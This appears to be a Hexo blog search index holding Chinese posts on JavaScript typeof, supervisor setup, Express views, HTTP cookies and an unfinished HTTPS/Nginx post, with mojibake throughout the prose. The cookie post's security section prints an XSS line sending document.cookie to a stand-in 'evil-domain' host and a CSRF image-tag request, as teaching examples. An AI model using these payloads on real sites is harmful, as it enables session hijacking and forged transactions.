href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/typeof">typeof</a> </li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/instanceof">instanceof</a> </li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/toString">Object.prototype.toString()</a></li><li><a href="http://www.nowamagic.net/librarys/veda/detail/1642">JavaScriptæ¢ç§˜ï¼šæ„é€ å‡½æ•° Constructor</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> javascript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> javascript </tag>
            
            <tag> typeof </tag>
            
            <tag> instanceof </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>supervisor.md</title>
      <link href="/post/supervisor.html"/>
      <url>/post/supervisor.html</url>
      
        <content type="html"><![CDATA[<h3 id="supervisor"><a href="#supervisor" class="headerlink" title="supervisor"></a>supervisor</h3><p>supervisorå°±æ˜¯ç”¨Pythonå¼€å‘çš„ä¸€å¥—é€šç”¨çš„è¿›ç¨‹ç®¡ç†ç¨‹åºï¼Œèƒ½å°†ä¸€ä¸ªæ™®é€šçš„å‘½ä»¤è¡Œè¿›ç¨‹å˜ä¸ºåå°daemonï¼Œå¹¶ç›‘æ§è¿›ç¨‹çŠ¶æ€ï¼Œå¼‚å¸¸é€€å‡ºæ—¶èƒ½è‡ªåŠ¨é‡å¯ã€‚</p><h4 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pip install supervisor</span><br></pre></td></tr></table></figure><h4 id="é…ç½®"><a href="#é…ç½®" class="headerlink" title="é…ç½®"></a>é…ç½®</h4><p>ç”Ÿæˆé…ç½®æ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo_supervisord_conf &gt; /etc/supervisor/supervisord.conf</span><br></pre></td></tr></table></figure><blockquote><p>ä¿®æ”¹ supervisord.confçš„æ–‡ä»¶[include]é…ç½®ï¼Œå¯ä»¥ç”¨æ¥æŒ‡åŒ…å«æ‰€æœ‰çš„é…ç½®æ–‡ä»¶[include] files &#x3D; &#x2F;etc&#x2F;supervisor&#x2F;conf.d&#x2F;* .conf</p></blockquote><p>å¯åŠ¨supervisord</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">supervisord -c /etc/supervisor/supervisord.conf</span><br></pre></td></tr></table></figure><p>program é…ç½® åœ¨<code>/etc/supervisor/</code>ç›®å½•ä¸‹æ–°å»ºä¸€ä¸ªæ–‡ä»¶<a href="http://www.conf/">www.conf</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[program:express]</span><br><span class="line">directory = /home/node/projects/express ; é¡¹ç›®ç›®å½•å¯åŠ¨ç›®å½•</span><br><span class="line">command = node bin/www  ; å¯åŠ¨å‘½ä»¤ï¼Œå¯ä»¥çœ‹å‡ºä¸æ‰‹åŠ¨åœ¨å‘½ä»¤è¡Œå¯åŠ¨çš„å‘½ä»¤æ˜¯ä¸€æ ·çš„</span><br><span class="line">autostart = true     ; åœ¨ supervisord å¯åŠ¨çš„æ—¶å€™ä¹Ÿè‡ªåŠ¨å¯åŠ¨</span><br><span class="line">startsecs = 5        ; å¯åŠ¨ 5 ç§’åæ²¡æœ‰å¼‚å¸¸é€€å‡ºï¼Œå°±å½“ä½œå·²ç»æ­£å¸¸å¯åŠ¨äº†</span><br><span class="line">autorestart = true   ; ç¨‹åºå¼‚å¸¸é€€å‡ºåè‡ªåŠ¨é‡å¯</span><br><span class="line">startretries = 5     ; å¯åŠ¨å¤±è´¥è‡ªåŠ¨é‡è¯•æ¬¡æ•°ï¼Œé»˜è®¤æ˜¯ 3</span><br><span class="line">user = node          ; ç”¨å“ªä¸ªç”¨æˆ·å¯åŠ¨</span><br><span class="line">redirect_stderr = true  ; æŠŠ stderr é‡å®šå‘åˆ° stdoutï¼Œé»˜è®¤ false</span><br><span class="line">stdout_logfile_maxbytes = 100MB  ; stdout æ—¥å¿—æ–‡ä»¶å¤§å°ï¼Œé»˜è®¤ 50MB</span><br><span class="line">stdout_logfile_backups = 20     ; stdout æ—¥å¿—æ–‡ä»¶å¤‡ä»½æ•°</span><br><span class="line">; stdout æ—¥å¿—æ–‡ä»¶ï¼Œéœ€è¦æ³¨æ„å½“æŒ‡å®šç›®å½•ä¸å­˜åœ¨æ—¶æ— æ³•æ­£å¸¸å¯åŠ¨ï¼Œæ‰€ä»¥éœ€è¦æ‰‹åŠ¨åˆ›å»ºç›®å½•ï¼ˆsupervisord ä¼šè‡ªåŠ¨åˆ›å»ºæ—¥å¿—æ–‡ä»¶ï¼‰</span><br><span class="line">stdout_logfile = /var/log/express_stdout.log</span><br><span class="line">environment=NODE_ENV=production</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ supervisorctl  </p><blockquote><p>Supervisorctl æ˜¯ supervisord çš„ä¸€ä¸ªå‘½ä»¤è¡Œå®¢æˆ·ç«¯å·¥å…·ï¼Œå¯åŠ¨æ—¶éœ€è¦æŒ‡å®šä¸ supervisord ä½¿ç”¨åŒä¸€ä»½é…ç½®æ–‡ä»¶</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">supervisorctl -c /etc/supervisor/supervisord.conf</span><br></pre></td></tr></table></figure><p>å¯åŠ¨åä¼šè¿›å…¥ä¸€ä¸ªäº¤äº’ç¯å¢ƒ  </p><ul><li>status ; è·å¾—æ‰€æœ‰ç¨‹åºçŠ¶æ€  </li><li>stop express; åœæ­¢expressè¿™ä¸ªé¡¹ç›®  </li><li>start express; å¯åŠ¨expressè¿™ä¸ªé¡¹ç›®  </li><li>shutdown ; å…³é—­æ‰€æœ‰é¡¹ç›®  </li><li>reread ; è¯»å–æœ‰æ›´æ–°ï¼ˆå¢åŠ ï¼‰çš„é…ç½®æ–‡ä»¶ï¼Œä¸ä¼šå¯åŠ¨æ–°æ·»åŠ çš„ç¨‹åº* update ; é‡å¯é…ç½®æ–‡ä»¶ä¿®æ”¹è¿‡çš„ç¨‹åº</li></ul><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><p><a href="http://www.ttlsa.com/linux/using-supervisor-control-program/">ã€1ã€‘</a> <a href="http://www.liaoxuefeng.com/article/0013738926914703df5e93589a14c19807f0e285194fe84000">ã€2ã€‘</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>express-view.md</title>
      <link href="/post/express-view.html"/>
      <url>/post/express-view.html</url>
      
        <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">app.set(&#x27;views&#x27;, path.join(__dirname, &#x27;views&#x27;));</span><br><span class="line">// æ³¨å†Œæ¨¡æ¿å¼•æ“</span><br><span class="line">app.set(&#x27;view engine&#x27;, &#x27;html&#x27;);</span><br><span class="line">// æ³¨å†Œæ¨¡æ¿å¼•æ“å®ç°</span><br><span class="line">app.engine(&#x27;html&#x27;, ejs.renderFile);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> express </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTTP Cookies</title>
      <link href="/post/cookie.html"/>
      <url>/post/cookie.html</url>
      
        <content type="html"><![CDATA[<h2 id="HTTP-Cookies"><a href="#HTTP-Cookies" class="headerlink" title="HTTP Cookies"></a>HTTP Cookies</h2><h3 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h3><p>HTTP Cookieï¼ˆä¹Ÿå«Web cookieæˆ–è€…æµè§ˆå™¨Cookieï¼‰æ˜¯æœåŠ¡å™¨å‘é€åˆ°ç”¨æˆ·æµè§ˆå™¨å¹¶ä¿å­˜åœ¨æµè§ˆå™¨ä¸Šçš„ä¸€å—æ•°æ®ï¼Œå®ƒä¼šåœ¨æµè§ˆå™¨ä¸‹ä¸€æ¬¡å‘èµ·è¯·æ±‚æ—¶è¢«æºå¸¦å¹¶å‘é€åˆ°æœåŠ¡å™¨ä¸Šã€‚</p><h3 id="åˆ›å»º-Cookie"><a href="#åˆ›å»º-Cookie" class="headerlink" title="åˆ›å»º Cookie"></a>åˆ›å»º Cookie</h3><p>æœåŠ¡å™¨ä½¿ç”¨Set-Cookieå“åº”å¤´éƒ¨å‘ç”¨æˆ·ä»£ç†ï¼ˆä¸€èˆ¬æŒ‡æµè§ˆå™¨ï¼‰å‘é€Cookieä¿¡æ¯ã€‚ä¸€ä¸ªç®€å•çš„Cookieå¯èƒ½åƒè¿™æ ·ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: &lt;cookieåç§°&gt;=&lt;cookieå€¼&gt;</span><br></pre></td></tr></table></figure><p>è®¾ç½®å®Œ Cookie åå¯¹è¯¥æœåŠ¡å™¨å‘èµ·çš„æ¯ä¸€æ¬¡æ–°çš„è¯·æ±‚ï¼Œæµè§ˆå™¨éƒ½ä¼šå°†ä¹‹å‰ä¿å­˜çš„Cookieä¿¡æ¯é€šè¿‡Cookieè¯·æ±‚å¤´å‘é€ç»™æœåŠ¡å™¨ã€‚</p><h4 id="ä¼šè¯æœŸCookie"><a href="#ä¼šè¯æœŸCookie" class="headerlink" title="ä¼šè¯æœŸCookie"></a>ä¼šè¯æœŸCookie</h4><p>ä¼šè¯æœŸ Cookie æ˜¯æœ€ç®€å•çš„ Cookieï¼šæµè§ˆå™¨å…³é—­ä¹‹åå®ƒä¼šè¢«è‡ªåŠ¨åˆ é™¤ï¼Œä¹Ÿå°±æ˜¯å®ƒä»…åœ¨ä¼šè¯æœŸé—´æœ‰æ•ˆã€‚ä¼šè¯æœŸ Cookie <em>ä¸éœ€è¦æŒ‡å®šè¿‡æœŸæ—¶é—´ï¼ˆExpiresï¼‰æˆ–è€…æœ‰æ•ˆæœŸï¼ˆMax-Ageï¼‰</em> ã€‚éœ€æ³¨æ„çš„æ˜¯ï¼Œæœ‰äº›æµè§ˆå™¨æä¾›äº†ä¼šè¯æ¢å¤çš„åŠŸèƒ½ï¼Œè¿™ç§æƒ…å†µä¸‹å³ä¾¿å…³é—­äº†æµè§ˆå™¨ä¼šè¯æœŸ Cookie ä¹Ÿä¼šè¢«ä¿å­˜ï¼Œå°±å¥½åƒæµè§ˆå™¨ä»æ¥æ²¡æœ‰å…³é—­ä¸€æ ·ã€‚</p><h4 id="æŒä¹…Cookie"><a href="#æŒä¹…Cookie" class="headerlink" title="æŒä¹…Cookie"></a>æŒä¹…Cookie</h4><p>å’Œå…³é—­æµè§ˆå™¨ä¾¿å¤±æ•ˆä¸åŒï¼ŒæŒä¹…Cookieå¯ä»¥æŒ‡å®šä¸€ä¸ªç‰¹å®šçš„è¿‡æœŸæ—¶é—´ï¼ˆExpiresï¼‰æˆ–è€…æœ‰æ•ˆæœŸï¼ˆMax-Ageï¼‰ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;</span><br></pre></td></tr></table></figure><h4 id="å®‰å…¨å’ŒHttpOnlyç±»å‹Cookie"><a href="#å®‰å…¨å’ŒHttpOnlyç±»å‹Cookie" class="headerlink" title="å®‰å…¨å’ŒHttpOnlyç±»å‹Cookie"></a>å®‰å…¨å’ŒHttpOnlyç±»å‹Cookie</h4><p>åªæœ‰åœ¨ä½¿ç”¨ SLL å’Œ HTTPS åè®®å‘æœåŠ¡å™¨å‘èµ·è¯·æ±‚æ—¶ï¼Œæ‰èƒ½ç¡®ä¿ Cookie è¢«å®‰å…¨åœ°å‘é€åˆ°æœåŠ¡å™¨ã€‚HttpOnly æ ‡å¿—å¹¶æ²¡æœ‰ç»™ä½ æä¾›é¢å¤–çš„åŠ å¯†æˆ–è€…å®‰å…¨æ€§ä¸Šçš„èƒ½åŠ›ï¼Œå½“æ•´ä¸ªæœºå™¨æš´éœ²åœ¨ä¸å®‰å…¨çš„ç¯å¢ƒæ—¶ï¼Œåˆ‡è®°ç»ä¸èƒ½é€šè¿‡ HTTP Cookie å­˜å‚¨ã€ä¼ è¾“æœºå¯†æˆ–è€…æ•æ„Ÿä¿¡æ¯ã€‚</p><p>HTTP-only ç±»å‹çš„ Cookie ä¸èƒ½ä½¿ç”¨ Javascript é€šè¿‡ <code>Document.cookie</code> å±æ€§æ¥è®¿é—®ï¼Œä»è€Œèƒ½å¤Ÿåœ¨ä¸€å®šç¨‹åº¦ä¸Šé˜»æ­¢åŸŸè„šæœ¬æ”»å‡»ï¼ˆXSSï¼‰ã€‚å½“ä½ ä¸éœ€è¦åœ¨ JavaScript ä»£ç ä¸­è®¿é—®ä½ çš„ Cookie æ—¶ï¼Œå¯ä»¥å°†è¯¥ Cookie è®¾ç½®æˆ HttpOnly ç±»å‹ã€‚ç‰¹åˆ«çš„ï¼Œå½“ä½ çš„ Cookie ä»…ä»…æ˜¯ç”¨äºå®šä¹‰ä¼šè¯çš„æƒ…å†µä¸‹ï¼Œæœ€å¥½ç»™å®ƒè®¾ç½®ä¸€ä¸‹ HttpOnly æ ‡å¿—ã€‚</p><p>åªæœ‰å½“ä¸€ä¸ªè¯·æ±‚é€šè¿‡ SSL æˆ– HTTPS åˆ›å»ºæ—¶ï¼ŒåŒ…å« Secure é€‰é¡¹çš„ cookie æ‰èƒ½è¢«å‘é€è‡³æœåŠ¡å™¨ã€‚è¿™ç§ Cookie çš„å†…å®¹å…·æœ‰å¾ˆé«˜çš„ä»·å€¼ï¼Œå¦‚æœä»¥çº¯æ–‡æœ¬å½¢å¼ä¼ é€’å¾ˆæœ‰å¯èƒ½è¢«ç¯¡æ”¹ã€‚äº‹å®ä¸Šï¼Œæœºå¯†ä¸”æ•æ„Ÿçš„ä¿¡æ¯ç»ä¸åº”è¯¥åœ¨ Cookie ä¸­å­˜å‚¨æˆ–ä¼ è¾“ï¼Œå› ä¸º Cookie çš„æ•´ä¸ªæœºåˆ¶åŸæœ¬éƒ½æ˜¯ä¸å®‰å…¨çš„ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œåœ¨ HTTPS é“¾æ¥ä¸Šä¼ è¾“çš„ Cookie éƒ½ä¼šè¢«è‡ªåŠ¨æ·»åŠ ä¸Š Secure é€‰é¡¹ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly</span><br></pre></td></tr></table></figure><h4 id="Cookieçš„ä½œç”¨åŸŸ"><a href="#Cookieçš„ä½œç”¨åŸŸ" class="headerlink" title="Cookieçš„ä½œç”¨åŸŸ"></a>Cookieçš„ä½œç”¨åŸŸ</h4><p>Domain å’Œ Path æŒ‡ä»¤å®šä¹‰äº† Cookie çš„ä½œç”¨åŸŸï¼Œå³éœ€è¦å‘é€ Cookie çš„ URL é›†åˆã€‚</p><p>Domain æŒ‡ä»¤è§„å®šäº†éœ€è¦å‘é€ Cookie çš„ä¸»æœºåã€‚å¦‚æœæ²¡æœ‰æŒ‡å®šï¼Œé»˜è®¤ä¸ºå½“å‰çš„æ–‡æ¡£åœ°å€ä¸Šçš„ä¸»æœºåï¼ˆä½†æ˜¯ä¸åŒ…å«å­åŸŸåï¼‰ã€‚å¦‚æœæŒ‡å®šäº† Domainï¼Œåˆ™ä¸€èˆ¬åŒ…å«å­åŸŸåã€‚</p><p>å¦‚æœè®¾ç½®äº† Domain&#x3D;mozilla.org ï¼Œåˆ™ Cookie åŒ…å«åœ¨å­åŸŸåä¸­ï¼ˆå¦‚developer.mozilla.orgï¼‰ã€‚ä¸èƒ½è·¨åŸŸä¸Šè®¾ç½®ä¸€ä¸ª Cookieï¼Œå› ä¸ºè¿™ä¼šäº§ç”Ÿå®‰å…¨é—®é¢˜ã€‚ä¸åˆæ³•çš„ Domain é€‰æ‹©å°†ç›´æ¥è¢«å¿½ç•¥ã€‚</p><p>Path æŒ‡ä»¤è¡¨æ˜éœ€è¦å‘é€ Cookie çš„URLè·¯å¾„ã€‚å­—ç¬¦%x2F (å³â€&#x2F;â€œ)ç”¨åšæ–‡ä»¶å¤¹åˆ†éš”ç¬¦ï¼Œå­æ–‡ä»¶å¤¹ä¹Ÿä¼šè¢«åŒ¹é…åˆ°ã€‚</p><p>å¦‚è®¾ç½®Path&#x3D;&#x2F;docsï¼Œåˆ™ä¸‹é¢è¿™äº›åœ°å€éƒ½å°†åŒ¹é…åˆ°:</p><p>â€œ&#x2F;docsâ€,<br>â€œ&#x2F;docs&#x2F;Web&#x2F;â€œ,<br>â€œ&#x2F;docs&#x2F;Web&#x2F;HTTPâ€</p><h3 id="æ¸…ç†-Cookie"><a href="#æ¸…ç†-Cookie" class="headerlink" title="æ¸…ç† Cookie&#96;"></a>æ¸…ç† Cookie&#96;</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: &lt;cookieåç§°&gt;=; path=&lt;Path&gt;; expires=Thu, 01 Jan 1970 00:00:00 GMT</span><br></pre></td></tr></table></figure><h3 id="å®‰å…¨"><a href="#å®‰å…¨" class="headerlink" title="å®‰å…¨"></a>å®‰å…¨</h3><h4 id="ä¼šè¯åŠ«æŒå’ŒXSS"><a href="#ä¼šè¯åŠ«æŒå’ŒXSS" class="headerlink" title="ä¼šè¯åŠ«æŒå’ŒXSS"></a>ä¼šè¯åŠ«æŒå’ŒXSS</h4><p>åœ¨Webåº”ç”¨ä¸­ï¼ŒCookie å¸¸å¸¸ç”¨æ¥æ ‡è®°ç”¨æˆ·å’Œä¼šè¯æˆæƒã€‚å› æ­¤ï¼Œå¦‚æœçªƒå–äº† Web åº”ç”¨çš„ Cookieï¼Œå¯èƒ½å¯¼è‡´æˆæƒç”¨æˆ·çš„ä¼šè¯å—åˆ°æ”»å‡»ã€‚å¸¸ç”¨çš„çªƒå– Cookie çš„æ–¹æ³•æœ‰åˆ©ç”¨ç¤¾ä¼šå·¥ç¨‹å­¦è¿›è¡Œæ”»å‡»å’Œåˆ©ç”¨åº”ç”¨ç¨‹åºçš„æ¼æ´è¿›è¡ŒXSSæ”»å‡»ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">new</span> <span class="title class_">Image</span>()).<span class="property">src</span> = <span class="string">&quot;http://www.evil-domain.com/steal-cookie.php?cookie=&quot;</span> + <span class="variable language_">document</span>.<span class="property">cookie</span>;</span><br></pre></td></tr></table></figure><p>HttpOnly ç±»å‹çš„ Cookie ç”±äºé˜»æ­¢äº† JavaScript å¯¹ Cookie è¿›è¡Œè®¿é—®è€Œèƒ½åœ¨ä¸€å®šç¨‹åº¦ä¸Šç¼“è§£æ­¤ç±»æ”»å‡»ã€‚</p><h4 id="è·¨ç«™è¯·æ±‚ä¼ªé€ ï¼ˆCSRFï¼‰"><a href="#è·¨ç«™è¯·æ±‚ä¼ªé€ ï¼ˆCSRFï¼‰" class="headerlink" title="è·¨ç«™è¯·æ±‚ä¼ªé€ ï¼ˆCSRFï¼‰"></a>è·¨ç«™è¯·æ±‚ä¼ªé€ ï¼ˆCSRFï¼‰</h4><p>ç»´åŸºç™¾ç§‘å·²ç»ç»™äº†ä¸€ä¸ªæ¯”è¾ƒå¥½çš„ CSRF ä¾‹å­ã€‚åœ¨è¿™ä¸ªæƒ…å†µä¸‹ï¼Œæœ‰ä¸€å¼ å¹¶ä¸çœŸå®å­˜åœ¨çš„å›¾ç‰‡ï¼ˆå¯èƒ½æ˜¯åœ¨ä¸å®‰å…¨èŠå¤©å®¤æˆ–è®ºå›ï¼‰ï¼Œå®ƒå®é™…ä¸Šæ˜¯å‘ä½ çš„é“¶è¡ŒæœåŠ¡å™¨å‘é€äº†æç°è¯·æ±‚ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;http://bank.example.com/withdraw?account=bob&amp;amount=1000000&amp;for=mallory&quot;&gt;</span><br></pre></td></tr></table></figure><p>å½“ä½ æ‰“å¼€å«æœ‰äº†è¿™å¼ å›¾ç‰‡ï¼ˆ<strong>æœ¬è´¨ä¸Šä¸å­˜åœ¨è¿™å¼ å›¾ç‰‡ï¼Œåªæ˜¯ä¸ºäº†åˆ©ç”¨æµè§ˆå™¨åŠ è½½å›¾ç‰‡å»å‘é€è¯·æ±‚ã€‚ä¸æ˜¯ Ajax è¯·æ±‚ï¼Œæµè§ˆå™¨ä¸ä¼šå› ä¸ºè·¨åŸŸè€Œæ‹¦æˆªã€‚</strong>ï¼‰çš„HTMLé¡µé¢æ—¶ï¼Œå¦‚æœ <strong>ä½ å·²ç»ç™»å½•äº†ä½ çš„é“¶è¡Œå¸å·å¹¶ä¸”è¿˜æœ‰æ•ˆ</strong>ï¼ˆè€Œä¸”æ²¡æœ‰å…¶å®ƒéªŒè¯æ­¥éª¤ï¼‰ï¼Œä½ çš„é“¶è¡Œé‡Œçš„é’±å¯èƒ½ä¼šè¢«è‡ªåŠ¨è½¬èµ°ã€‚</p><h3 id="Cookie-VS-Session"><a href="#Cookie-VS-Session" class="headerlink" title="Cookie VS Session"></a>Cookie VS Session</h3><p>Cookie å’Œ Session æœ¬èº«æ²¡ä»€ä¹ˆè”ç³»ã€‚Cookie æ˜¯æ”¾ç½®åˆ°å®¢æˆ·ç«¯çš„ï¼ŒSession æ˜¯æ”¾ç½®åœ¨æœåŠ¡å™¨ç«¯çš„ã€‚æœåŠ¡å™¨ç«¯çš„ Session å…¶å®å°±æ˜¯ä¸€ä¸ª K-V å½¢å¼çš„é”®å€¼å¯¹ï¼ŒKey å°±æ˜¯ SessionIDã€‚å¾ˆå¤šæ—¶å€™æˆ‘ä»¬å°±æŠŠ SessionID æ”¾ç½®åˆ° Cookie ä¸­ï¼Œåˆ©ç”¨ <strong>æµè§ˆå™¨ä¸‹ä¸€æ¬¡å‘èµ·è¯·æ±‚æ—¶ä¼šæºå¸¦ Cookie å¹¶å‘é€åˆ°æœåŠ¡å™¨ä¸Š</strong> çš„ä¾¿åˆ©æ¥è·Ÿè¸ªæ ‡è¯†ä¸€ä¸ªç”¨æˆ·ã€‚æœåŠ¡å™¨ç«¯ä» Cookie ä¸­æ‹¿åˆ° SessionIDï¼Œç”¨ SessionID æ‹¿åˆ° Session çš„ä¿¡æ¯ã€‚å¾ˆå¤šæƒ…å†µä¸‹æˆ‘ä»¬ä¼šåœ¨æµè§ˆå™¨åœ°å€æ è§åˆ°ç±»ä¼¼<code>?jsessionid=xxxxx</code>çš„URLï¼Œè¿™ç§æƒ…å†µå°±æ˜¯æŠŠ SessionID æ”¾ç½®åˆ° URL ä¸­æ¥æºå¸¦ï¼Œåœ¨å®¢æˆ·ç«¯ä¸æ”¯æŒ Cookie çš„æƒ…å†µä¸‹ä½¿ç”¨ã€‚ä¹‹æ‰€ä»¥æˆ‘ä»¬ä¸€çœ‹åˆ° Session å°±ä¼šæåˆ° Cookie æ˜¯å› ä¸º Cookie æºå¸¦ SessionID ååˆ†ä¾¿åˆ©ç½¢äº†ã€‚</p><h3 id="æ³¨æ„äº‹é¡¹åŠå¸¸è§é—®é¢˜"><a href="#æ³¨æ„äº‹é¡¹åŠå¸¸è§é—®é¢˜" class="headerlink" title="æ³¨æ„äº‹é¡¹åŠå¸¸è§é—®é¢˜"></a>æ³¨æ„äº‹é¡¹åŠå¸¸è§é—®é¢˜</h3><h3 id="è·¨åŸŸæºå¸¦-Cookie-é—®é¢˜"><a href="#è·¨åŸŸæºå¸¦-Cookie-é—®é¢˜" class="headerlink" title="è·¨åŸŸæºå¸¦ Cookie é—®é¢˜"></a>è·¨åŸŸæºå¸¦ Cookie é—®é¢˜</h3><p>CORS è¯·æ±‚é»˜è®¤ä¸å‘é€ Cookie å’Œ HTTP è®¤è¯ä¿¡æ¯ã€‚å¦‚æœè¦æŠŠ Cookie å‘åˆ°æœåŠ¡å™¨ï¼Œä¸€æ–¹é¢è¦æœåŠ¡å™¨åŒæ„ï¼ŒæŒ‡å®š Access-Control-Allow-Credentials å­—æ®µ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Access-Control-Allow-Credentials: true</span><br></pre></td></tr></table></figure><p>å¦ä¸€æ–¹é¢ï¼Œå¼€å‘è€…å¿…é¡»åœ¨AJAXè¯·æ±‚ä¸­æ‰“å¼€withCredentialså±æ€§ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var xhr = new XMLHttpRequest();</span><br><span class="line">xhr.withCredentials = true;</span><br></pre></td></tr></table></figure><p>å¦åˆ™ï¼Œå³ä½¿æœåŠ¡å™¨åŒæ„å‘é€ Cookieï¼Œæµè§ˆå™¨ä¹Ÿä¸ä¼šå‘é€ã€‚æˆ–è€…ï¼ŒæœåŠ¡å™¨è¦æ±‚è®¾ç½® Cookieï¼Œæµè§ˆå™¨ä¹Ÿä¸ä¼šå¤„ç†ã€‚<br>ä½†æ˜¯ï¼Œå¦‚æœçœç•¥ withCredentials è®¾ç½®ï¼Œæœ‰çš„æµè§ˆå™¨è¿˜æ˜¯ä¼šä¸€èµ·å‘é€Cookieã€‚è¿™æ—¶ï¼Œå¯ä»¥æ˜¾å¼å…³é—­ withCredentialsã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xhr.withCredentials = false;</span><br></pre></td></tr></table></figure><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå¦‚æœè¦å‘é€ Cookieï¼ŒAccess-Control-Allow-Origin å°±ä¸èƒ½è®¾ä¸ºæ˜Ÿå·ï¼Œå¿…é¡»æŒ‡å®šæ˜ç¡®çš„ã€ä¸è¯·æ±‚ç½‘é¡µä¸€è‡´çš„åŸŸåã€‚åŒæ—¶ï¼ŒCookieä¾ç„¶éµå¾ªåŒæºæ”¿ç­–ï¼Œåªæœ‰ç”¨æœåŠ¡å™¨åŸŸåè®¾ç½®çš„ Cookie æ‰ä¼šä¸Šä¼ ï¼Œå…¶ä»–åŸŸåçš„ Cookie å¹¶ä¸ä¼šä¸Šä¼ ï¼Œä¸”ï¼ˆè·¨æºï¼‰åŸç½‘é¡µä»£ç ä¸­çš„ <code>document.cookie</code> ä¹Ÿæ— æ³•è¯»å–æœåŠ¡å™¨åŸŸåä¸‹çš„ Cookieã€‚</p><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><ul><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Cookies">HTTP cookies</a> </li><li><a href="http://bubkoo.com/2014/04/21/http-cookies-explained/">HTTP cookies è¯¦è§£</a> </li><li><a href="http://www.ruanyifeng.com/blog/2016/04/cors.html">CORS</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> http </tag>
            
            <tag> cookie </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTTPS</title>
      <link href="/post/https.html"/>
      <url>/post/https.html</url>
      
        <content type="html"><![CDATA[<h2 id="TODO-HTTPS"><a href="#TODO-HTTPS" class="headerlink" title="[TODO]HTTPS"></a>[TODO]HTTPS</h2><h3 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h3><p><img src="/images/QQ20160825-1@2x.jpg"></p><h3 id="éƒ¨ç½²"><a href="#éƒ¨ç½²" class="headerlink" title="éƒ¨ç½²"></a>éƒ¨ç½²</h3><p><a href="https://mozilla.github.io/server-side-tls/ssl-config-generator/">https://mozilla.github.io/server-side-tls/ssl-config-generator/</a><br><a href="https://cipherli.st/">https://cipherli.st/</a><br><a href="https://weakdh.org/sysadmin.html">https://weakdh.org/sysadmin.html</a></p><h4 id="Nginxé…ç½®"><a href="#Nginxé…ç½®" class="headerlink" title="Nginxé…ç½®"></a>Nginxé…ç½®</h4><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span> <span class="number">443</span> ssl;</span><br><span class="line">    <span class="attribute">server_name</span> YOUR_DOMAINNAME_HERE;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">ssl_certificate</span>        